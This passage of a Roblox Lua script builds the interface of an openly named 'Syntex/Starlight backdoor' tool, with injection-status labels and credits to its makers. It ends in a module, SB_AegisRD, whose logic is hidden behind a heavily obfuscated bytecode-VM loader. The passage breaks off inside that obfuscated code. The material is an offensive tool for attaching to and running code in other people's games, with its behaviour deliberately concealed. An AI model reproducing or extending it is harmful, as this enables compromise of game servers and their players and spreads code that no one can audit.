-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.Frame.UICorner
G2L["14e"] = Instance.new("UICorner", G2L["14d"]);
G2L["14e"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.syntaxHighlight.TextButton.Frame.UIStroke
G2L["14f"] = Instance.new("UIStroke", G2L["14d"]);
G2L["14f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["14f"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.galaxyThemeGradient
G2L["150"] = Instance.new("UIGradient", G2L["fa"]);
G2L["150"]["Enabled"] = false;
G2L["150"]["Rotation"] = 132;
G2L["150"]["Name"] = [[galaxyThemeGradient]];
G2L["150"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 18, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.galaxyThemeGradient.LocalScript
G2L["151"] = Instance.new("LocalScript", G2L["150"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.lunarThemeGradient
G2L["152"] = Instance.new("UIGradient", G2L["fa"]);
G2L["152"]["Enabled"] = false;
G2L["152"]["Rotation"] = 132;
G2L["152"]["Name"] = [[lunarThemeGradient]];
G2L["152"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.lunarThemeGradient.LocalScript
G2L["153"] = Instance.new("LocalScript", G2L["152"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO
G2L["154"] = Instance.new("Frame", G2L["c"]);
G2L["154"]["BorderSizePixel"] = 0;
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["154"]["Position"] = UDim2.new(0.44481, 0, 0.37913, 0);
G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["Name"] = [[LOGO]];
G2L["154"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Main2
G2L["155"] = Instance.new("ImageLabel", G2L["154"]);
G2L["155"]["ZIndex"] = 3;
G2L["155"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["155"]["ImageTransparency"] = 1;
G2L["155"]["Image"] = [[rbxassetid://7102276469]];
G2L["155"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["155"]["BorderColor3"] = Color3.fromRGB(29, 44, 55);
G2L["155"]["BackgroundTransparency"] = 1;
G2L["155"]["Name"] = [[Main2]];
G2L["155"]["Position"] = UDim2.new(0, 321312480, 0, 321312384);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Orbit
G2L["156"] = Instance.new("ImageLabel", G2L["154"]);
G2L["156"]["ZIndex"] = 2;
G2L["156"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["156"]["Image"] = [[http://www.roblox.com/asset/?id=6208815613]];
G2L["156"]["BorderColor3"] = Color3.fromRGB(29, 44, 55);
G2L["156"]["BackgroundTransparency"] = 1;
G2L["156"]["Name"] = [[Orbit]];
G2L["156"]["Position"] = UDim2.new(2.38923, 0, 1.40715, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring
G2L["157"] = Instance.new("TextButton", G2L["154"]);
G2L["157"]["Interactable"] = false;
G2L["157"]["BorderSizePixel"] = 0;
G2L["157"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["157"]["TextSize"] = 14;
G2L["157"]["BackgroundColor3"] = Color3.fromRGB(58, 58, 58);
G2L["157"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["157"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["157"]["Name"] = [[Ring]];
G2L["157"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["157"]["Text"] = [[]];
G2L["157"]["Position"] = UDim2.new(-0.0045, 0, -0.00762, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.TextLabel
G2L["158"] = Instance.new("TextLabel", G2L["157"]);
G2L["158"]["TextWrapped"] = true;
G2L["158"]["BorderSizePixel"] = 0;
G2L["158"]["TextSize"] = 14;
G2L["158"]["TextScaled"] = true;
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["158"]["TextColor3"] = Color3.fromRGB(207, 207, 207);
G2L["158"]["BackgroundTransparency"] = 1;
G2L["158"]["Size"] = UDim2.new(0, 75, 0, 81);
G2L["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Text"] = [[S]];
G2L["158"]["Position"] = UDim2.new(0.12, 0, 0.09, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.TextLabel
G2L["159"] = Instance.new("TextLabel", G2L["157"]);
G2L["159"]["TextWrapped"] = true;
G2L["159"]["BorderSizePixel"] = 0;
G2L["159"]["TextSize"] = 14;
G2L["159"]["TextScaled"] = true;
G2L["159"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["159"]["TextColor3"] = Color3.fromRGB(209, 209, 209);
G2L["159"]["BackgroundTransparency"] = 1;
G2L["159"]["Size"] = UDim2.new(0, 34, 0, 36);
G2L["159"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Text"] = [[B]];
G2L["159"]["Position"] = UDim2.new(0.66, 0, 0.63, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.version
G2L["15a"] = Instance.new("TextLabel", G2L["157"]);
G2L["15a"]["TextWrapped"] = true;
G2L["15a"]["BorderSizePixel"] = 0;
G2L["15a"]["TextSize"] = 14;
G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15a"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["15a"]["BackgroundTransparency"] = 1;
G2L["15a"]["Size"] = UDim2.new(0, 49, 0, 28);
G2L["15a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15a"]["Text"] = [[V1.2.5]];
G2L["15a"]["Name"] = [[version]];
G2L["15a"]["Position"] = UDim2.new(0, 0, -0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame
G2L["15b"] = Instance.new("Frame", G2L["157"]);
G2L["15b"]["Visible"] = false;
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(58, 58, 58);
G2L["15b"]["Size"] = UDim2.new(0, 204, 0, 100);
G2L["15b"]["Position"] = UDim2.new(1.22, 0, 0, 0);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.TextLabel
G2L["15c"] = Instance.new("TextLabel", G2L["15b"]);
G2L["15c"]["TextWrapped"] = true;
G2L["15c"]["BorderSizePixel"] = 0;
G2L["15c"]["TextSize"] = 19;
G2L["15c"]["TextScaled"] = true;
G2L["15c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15c"]["TextColor3"] = Color3.fromRGB(195, 195, 195);
G2L["15c"]["BackgroundTransparency"] = 1;
G2L["15c"]["RichText"] = true;
G2L["15c"]["Size"] = UDim2.new(0, 190, 0, 59);
G2L["15c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15c"]["Text"] = [[Starlight backdoor, made by Rarbw14 (Starlight), and R00GEMANs (Rating)]];
G2L["15c"]["Position"] = UDim2.new(0.03792, 0, 0.07, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.Injected
G2L["15d"] = Instance.new("TextLabel", G2L["15b"]);
G2L["15d"]["TextWrapped"] = true;
G2L["15d"]["BorderSizePixel"] = 0;
G2L["15d"]["TextSize"] = 18;
G2L["15d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["15d"]["TextScaled"] = true;
G2L["15d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15d"]["TextColor3"] = Color3.fromRGB(195, 195, 195);
G2L["15d"]["BackgroundTransparency"] = 1;
G2L["15d"]["Size"] = UDim2.new(0, 190, 0, 30);
G2L["15d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15d"]["Text"] = [[Status : Not attached]];
G2L["15d"]["Name"] = [[Injected]];
G2L["15d"]["Position"] = UDim2.new(0.03792, 0, 0.65647, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.UIGradient
G2L["15e"] = Instance.new("UIGradient", G2L["15b"]);
G2L["15e"]["Rotation"] = 132;
G2L["15e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(133, 0, 0)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 112, 8))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.UIGradient.LocalScript
G2L["15f"] = Instance.new("LocalScript", G2L["15e"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.UICorner
G2L["160"] = Instance.new("UICorner", G2L["15b"]);
G2L["160"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.Frame.UIStroke
G2L["161"] = Instance.new("UIStroke", G2L["15b"]);
G2L["161"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["161"]["Thickness"] = 2;
G2L["161"]["Color"] = Color3.fromRGB(36, 36, 36);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.UICorner
G2L["162"] = Instance.new("UICorner", G2L["157"]);
G2L["162"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.UIGradient
G2L["163"] = Instance.new("UIGradient", G2L["157"]);
G2L["163"]["Rotation"] = 132;
G2L["163"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.UIGradient.LocalScript
G2L["164"] = Instance.new("LocalScript", G2L["163"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Ring.UIStroke
G2L["165"] = Instance.new("UIStroke", G2L["157"]);
G2L["165"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["165"]["Thickness"] = 2;
G2L["165"]["Color"] = Color3.fromRGB(36, 36, 36);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.UICorner
G2L["166"] = Instance.new("UICorner", G2L["154"]);
G2L["166"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.LOGO.Outline
G2L["167"] = Instance.new("Frame", G2L["154"]);
G2L["167"]["Visible"] = false;
G2L["167"]["ZIndex"] = 2;
G2L["167"]["BackgroundColor3"] = Color3.fromRGB(18, 154, 255);
G2L["167"]["Size"] = UDim2.new(0.24, 0, 0.24, 0);
G2L["167"]["BorderColor3"] = Color3.fromRGB(18, 154, 255);
G2L["167"]["Name"] = [[Outline]];
G2L["167"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.Modules
G2L["168"] = Instance.new("Folder", G2L["2"]);
G2L["168"]["Name"] = [[Modules]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.Modules.SB_AegisRD
G2L["169"] = Instance.new("ModuleScript", G2L["168"]);
G2L["169"]["Name"] = [[SB_AegisRD]];


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
	local ModuleState = G2L_MODULES[Module];
	if ModuleState then
		if not ModuleState.Required then
			ModuleState.Required = true;
			ModuleState.Value = ModuleState.Closure();
		end
		return ModuleState.Value;
	end;
	return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["169"]] = {
	Closure = function(...)
		return (function(...)
			local script = G2L["169"];local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v80=v2(v0(v30,16));if v19 then local v91=0;local v92;while true do if (v91==0) then v92=v5(v80,v19);v19=nil;v91=1;end if (v91==1) then return v92;end end else return v80;end end end);local function v20(v31,v32,v33) if v33 then local v81=0 -0 ;local v82;while true do if (v81==(0 -0)) then v82=(v31/(((1640 -(1523 + 114)) -1)^(v32-(2 -1))))%((621 -(555 + 64))^(((v33-(932 -(857 + 74))) -(v32-(569 -(367 + 201)))) + 1)) ;return v82-(v82%((834 + 94) -((304 -90) + 713))) ;end end else local v83=2^(v32-(1 + 0)) ;return (((v31%(v83 + v83))>=v83) and ((1066 -(68 + 997)) + 0)) or (877 -(282 + 595)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=1270 -((1183 -(892 + 65)) + 1044) ;local v36;local v37;while true do if (v35==(4 -3)) then return (v37 * (373 -(32 + 85))) + v36 ;end if (v35==0) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 2 ;v35=1 + (0 -0) ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (5 -2) );v18=v18 + (7 -3) ;return (v41 * (16777566 -(87 + 263))) + (v40 * ((161343 -95627) -(67 + 84 + 29))) + (v39 * (188 + 68)) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,1,(34 + 45) -59 ) * ((954 -(802 + 150))^(85 -53))) + v42 ;local v46=v20(v43,37 -(27 -11) ,23 + (446 -(145 + 293)) );local v47=((v20(v43,1029 -(915 + 82) )==(2 -1)) and  -1) or (1 + 0) ;if (v46==0) then if (v45==((430 -(44 + 386)) -0)) then return v47 * (1187 -(1069 + 118)) ;else v46=2 -1 ;v44=0 -(1486 -(998 + 488)) ;end elseif (v46==(356 + (2133 -(416 + 26)))) then return ((v45==(0 -(0 + 0))) and (v47 * ((1 + 0)/((2525 -1734) -(368 + 423))))) or (v47 * NaN) ;end return v8(v47,v46-(3214 -2191) ) * (v44 + (v45/((20 -(10 + 8))^(199 -147)))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(772 -(201 + 571))) then return "";end end v49=v3(v16,v18,(v18 + v48) -1 );v18=v18 + v48 ;local v50={};for v64=1139 -(116 + 1022) , #v49 do v50[v64]=v2(v1(v3(v49,v64,v64)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 0;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do if (2==v51) then for v93= #"[",v23() do local v94=(function() return v21();end)();if (v20(v94, #"}", #">")==0) then local v101=(function() return 574 -(507 + 67) ;end)();local v102=(function() return;end)();local v103=(function() return;end)();local v104=(function() return;end)();while true do if (v101~=(1749 -(1013 + 736))) then else local v105=(function() return 0 + 0 ;end)();while true do if (v105~=(0 -0)) then else v102=(function() return v20(v94,7 -5 , #"19(");end)();v103=(function() return v20(v94, #"asd1",6);end)();v105=(function() return 1;end)();end if (v105~=1) then else v101=(function() return 1;end)();break;end end end if (v101~=1) then else local v106=(function() return 867 -(550 + 317) ;end)();while true do if (v106~=1) then else v101=(function() return 2;end)();break;end if (v106==(0 -0)) then v104=(function() return {v22(),v22(),nil,nil};end)();if (v102==(0 -0)) then local v118=(function() return 0;end)();local v119=(function() return;end)();while true do if ((0 -0)~=v118) then else v119=(function() return 0;end)();while true do if (v119~=(285 -(134 + 151))) then else v104[ #"asd"]=(function() return v22();end)();v104[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v102== #"{") then v104[ #"91("]=(function() return v23();end)();elseif (v102==2) then v104[ #"asd"]=(function() return v23() -((1667 -(970 + 695))^16) ;end)();elseif (v102== #"19(") then local v1175=(function() return 0 -0 ;end)();local v1176=(function() return;end)();while true do if (v1175~=(1990 -(582 + 1408))) then else v1176=(function() return 0 -0 ;end)();while true do if (v1176==0) then v104[ #"asd"]=(function() return v23() -(2^(19 -3)) ;end)();v104[ #"?id="]=(function() return v22();end)();break;end end break;end end end v106=(function() return 3 -2 ;end)();end end end if (v101~=(1826 -(1195 + 629))) then else if (v20(v103, #"|", #"[")== #"!") then v104[2 -0 ]=(function() return v57[v104[243 -(187 + 54) ]];end)();end if (v20(v103,2,2)~= #"[") then else v104[ #"91("]=(function() return v57[v104[ #"xxx"]];end)();end v101=(function() return 783 -(162 + 618) ;end)();end if (v101==(3 + 0)) then if (v20(v103, #"-19", #"xnx")~= #"\\") then else v104[ #".dev"]=(function() return v57[v104[ #"?id="]];end)();end v52[v93]=(function() return v104;end)();break;end end end end for v95= #"~",v23() do v53[v95-#"}" ]=(function() return v28();end)();end return v55;end if (v51==(0 + 0)) then local v87=(function() return 0 -0 ;end)();local v88=(function() return;end)();while true do if (v87~=0) then else v88=(function() return 0;end)();while true do if (v88~=2) then else v51=(function() return  #"!";end)();break;end if (1~=v88) then else v54=(function() return {};end)();v55=(function() return {v52,v53,nil,v54};end)();v88=(function() return 2 -0 ;end)();end if (v88~=0) then else v52=(function() return {};end)();v53=(function() return {};end)();v88=(function() return 1 + 0 ;end)();end end break;end end end if (v51== #">") then local v89=(function() return 1636 -(1373 + 263) ;end)();local v90=(function() return;end)();while true do if (v89==(1000 -(451 + 549))) then v90=(function() return 0;end)();while true do if (v90==(1 + 1)) then v51=(function() return 2 -0 ;end)();break;end if (v90==(1 -0)) then for v109= #"|",v56 do local v110=(function() return 1384 -(746 + 638) ;end)();local v111=(function() return;end)();local v112=(function() return;end)();local v113=(function() return;end)();while true do if (v110==(0 + 0)) then local v117=(function() return 0;end)();while true do if (v117==0) then v111=(function() return 0 -0 ;end)();v112=(function() return nil;end)();v117=(function() return 342 -(218 + 123) ;end)();end if (v117==(1582 -(1535 + 46))) then v110=(function() return 1 + 0 ;end)();break;end end end if (v110==(1 + 0)) then v113=(function() return nil;end)();while true do if (v111~=(560 -(306 + 254))) then else local v515=(function() return 0;end)();local v516=(function() return;end)();while true do if ((0 + 0)==v515) then v516=(function() return 0;end)();while true do if (v516==(1 -0)) then v111=(function() return  #"~";end)();break;end if (v516~=(1467 -(899 + 568))) then else v112=(function() return v21();end)();v113=(function() return nil;end)();v516=(function() return 1 + 0 ;end)();end end break;end end end if (v111~= #"[") then else if (v112== #",") then v113=(function() return v21()~=(0 -0) ;end)();elseif (v112==(605 -(268 + 335))) then v113=(function() return v24();end)();elseif (v112~= #"91(") then else v113=(function() return v25();end)();end v57[v109]=(function() return v113;end)();break;end end break;end end end v55[ #"19("]=(function() return v21();end)();v90=(function() return 2;end)();end if (v90~=0) then else v56=(function() return v23();end)();v57=(function() return {};end)();v90=(function() return 1;end)();end end break;end end end end end local function v29(v58,v59,v60) local v61=v58[291 -(60 + 230) ];local v62=v58[574 -(426 + 146) ];local v63=v58[3];return function(...) local v66=v61;local v67=v62;local v68=v63;local v69=v27;local v70=1 + 0 ;local v71= -(1457 -(282 + 1174));local v72={};local v73={...};local v74=v12("#",...) -(2 -1) ;local v75={};local v76={};for v84=0 + 0 ,v74 do if ((v84>=v68) or (2395==1396)) then v72[v84-v68 ]=v73[v84 + (1025 -(706 + 318)) ];else v76[v84]=v73[v84 + (1252 -(597 + 124 + 530)) ];end end local v77=(v74-v68) + (1272 -((4154 -3209) + (807 -481))) ;local v78;local v79;while true do v78=v66[v70];v79=v78[2 -1 ];if ((v79<=(34 + 4)) or (2850==997)) then if ((4180<=4502) and (v79<=(718 -(271 + 429)))) then if ((v79<=(8 + 0)) or (149==893)) then if (v79<=(1503 -(1408 + 92))) then if (v79<=((1059 + 28) -((1212 -751) + 625))) then if (v79==(1288 -(993 + 295))) then local v120=0 + 0 ;local v121;while true do if ((1037<1746) and (v120==(1171 -(418 + 753)))) then v121=v78[1 + (1605 -(1032 + 572)) ];do return v76[v121],v76[v121 + 1 ];end break;end end else v76[v78[2]]=v59[v78[1 + 2 ]];end elseif (v79==(1 + 1)) then local v124=0;local v125;while true do if (v124==(420 -(203 + 214))) then v70=v70 + (1818 -(568 + 1249)) + 0 ;v78=v66[v70];v125=v78[531 -(406 + 123) ];v76[v125]=v76[v125]();v124=1773 -(1749 + 20) ;end if (v124==(1 + 3)) then v70=v70 + (1323 -(1249 + 73)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[1148 -(466 + 679) ]];v70=v70 + (2 -1) ;v124=14 -9 ;end if (v124==(1905 -(106 + 1794))) then v78=v66[v70];v76[v78[1 + 1 ]]=v78[1 + 2 + 0 ];v70=v70 + (2 -1) ;v78=v66[v70];v124=6;end if (v124==(5 -3)) then v76[v78[116 -(4 + 110) ]]=v60[v78[587 -(57 + 527) ]];v70=v70 + (1428 -(41 + 1386)) ;v78=v66[v70];v76[v78[105 -(17 + 86) ]]=v76[v78[3]][v78[3 + 1 ]];v124=6 -3 ;end if (v124==(2 -1)) then v78=v66[v70];v76[v78[168 -(122 + 44) ]]=v76[v78[5 -2 ]];v70=v70 + (3 -2) ;v78=v66[v70];v124=2 + 0 ;end if (v124==6) then v70=v78[1 + 2 ];break;end if (v124==0) then v125=nil;v125=v78[3 -(2 -1) ];v76[v125]=v76[v125]();v70=v70 + (66 -((115 -85) + 35)) ;v124=1;end end else v76[v78[(1308 -(913 + 393)) + 0 ]]=v76[v78[1260 -(1043 + (604 -390)) ]][v76[v78[4]]];end elseif ((3738>=3692) and (v79<=(18 -13))) then if ((v79==(1216 -(323 + 889))) or (3822<823)) then do return v76[v78[5 -3 ]];end else local v128;v76[v78[2 -0 ]]=v76[v78[(993 -(269 + 141)) -(361 + 219) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[322 -(53 + 267) ]]=v78[3];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[415 -(15 + 398) ]]=v78[985 -(18 + 964) ];v70=v70 + ((6 -3) -2) ;v78=v66[v70];v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + (1982 -(362 + 1619)) + 0 ,v78[2 + 1 ]));v70=v70 + (851 -(20 + (2455 -(950 + 675)))) ;v78=v66[v70];v76[v78[2 + 0 ]][v78[129 -(45 + 71 + 10) ]]=v76[v78[1 + (1182 -(216 + 963)) ]];v70=v70 + (739 -(542 + 196)) ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[1 + 2 ]];v70=v70 + (1288 -(485 + 802)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[(561 -(432 + 127)) + 1 ];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[(1077 -(1065 + 8)) -2 ]]=v78[1554 -(1126 + 425) ];v70=v70 + (406 -(118 + 287)) ;v78=v66[v70];v128=v78[7 -5 ];v76[v128]=v76[v128](v13(v76,v128 + ((624 + 498) -(118 + (2604 -(635 + 966)))) ,v78[8 -5 ]));v70=v70 + (378 -(142 + 169 + 66)) ;v78=v66[v70];v76[v78[9 -7 ]][v78[1 + 2 ]]=v76[v78[981 -(553 + (466 -(5 + 37))) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[3 -1 ]]=v76[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[3 + 0 ];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[3];v70=v70 + 1 + 0 ;v78=v66[v70];v128=v78[2 + 0 ];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[6 -3 ]));v70=v70 + ((4 -2) -1) ;v78=v66[v70];v76[v78[4 -2 ]][v78[1 + 0 + 2 ]]=v76[v78[19 -15 ]];v70=v70 + (754 -(239 + 514)) ;v78=v66[v70];v76[v78[2]]=v76[v78[2 + 1 ]];v70=v70 + (1330 -(797 + 532)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v78[2 + 1 ];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[2]]=v78[1205 -(373 + 829) ];v70=v70 + ((1157 -425) -(476 + 255)) ;v78=v66[v70];v128=v78[2];v76[v128]=v76[v128](v13(v76,v128 + (1131 -(369 + 761)) ,v78[1 + 1 + 1 ]));v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2]][v78[5 -2 ]]=v76[v78[7 -3 ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(909 -669) -(64 + 174) ]]=v76[v78[(1 -0) + (4 -2) ]];v70=v70 + (1 -(0 + 0)) ;v78=v66[v70];v76[v78[2]]=v78[339 -(144 + 192) ];v70=v70 + (217 -(42 + 174)) ;v78=v66[v70];v76[v78[2]]=v78[3 + 0 ];v70=v70 + 1 ;v78=v66[v70];v128=v78[2 + 0 ];v76[v128]=v76[v128](v13(v76,v128 + 1 + 0 ,v78[1507 -(363 + 1141) ]));v70=v70 + 1 ;v78=v66[v70];v76[v78[1582 -(1183 + 397) ]][v78[8 -5 ]]=v76[v78[3 + 1 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1977 -(1913 + 62) ]]=v76[v78[2 + 1 ]];v70=v70 + ((531 -(318 + 211)) -1) ;v78=v66[v70];v76[v78[1935 -((2780 -2215) + 1368) ]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v76[v78[7 -5 ]]=v78[1664 -(1477 + 184) ];v70=v70 + (1 -0) ;v78=v66[v70];v128=v78[2 + 0 ];v76[v128]=v76[v128](v13(v76,v128 + (857 -(564 + 292)) ,v78[4 -1 ]));v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[306 -(244 + 60) ]][v78[(1590 -(963 + 624)) + 0 ]]=v76[v78[480 -(41 + 435) ]];v70=v70 + (1002 -(938 + 63)) ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[1128 -(936 + 189) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[(847 -(518 + 328)) + 1 ]]=v78[1616 -(1565 + 48) ];v70=v70 + 1 + (0 -0) ;v78=v66[v70];v76[v78[(1822 -682) -(782 + 356) ]]=v78[270 -(176 + 91) ];v70=v70 + (2 -1) ;v78=v66[v70];v128=v78[2 -0 ];v76[v128]=v76[v128](v13(v76,v128 + 1 ,v78[1095 -(975 + 117) ]));v70=v70 + (1876 -(157 + 1718)) ;v78=v66[v70];v76[v78[2]][v78[3]]=v76[v78[4]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[10 -7 ]];v70=v70 + (3 -2) ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + ((1336 -(301 + 16)) -(697 + (940 -619))) ;v78=v66[v70];v76[v78[5 -3 ]]=v78[5 -2 ];v70=v70 + ((5 -3) -1) ;v78=v66[v70];v128=v78[1 + 1 ];v76[v128]=v76[v128](v13(v76,v128 + (1 -0) ,v78[7 -4 ]));v70=v70 + (1228 -((840 -518) + 820 + 85)) ;v78=v66[v70];v76[v78[613 -(602 + 9) ]][v78[3]]=v76[v78[1193 -(449 + 740) ]];v70=v70 + (873 -(469 + 357 + 46)) ;v78=v66[v70];v76[v78[949 -(245 + (1498 -796)) ]]=v76[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[(4 + 2) -(1 + 3) ]]=v78[1 + 2 ];v70=v70 + ((6037 -4138) -(260 + 1638)) ;v78=v66[v70];v76[v78[442 -(124 + 258 + 58) ]]=v78[9 -6 ];v70=v70 + 1 + 0 ;v78=v66[v70];v128=v78[3 -1 ];v76[v128]=v76[v128](v13(v76,v128 + (2 -1) ,v78[3]));v70=v70 + (1206 -(902 + 303)) 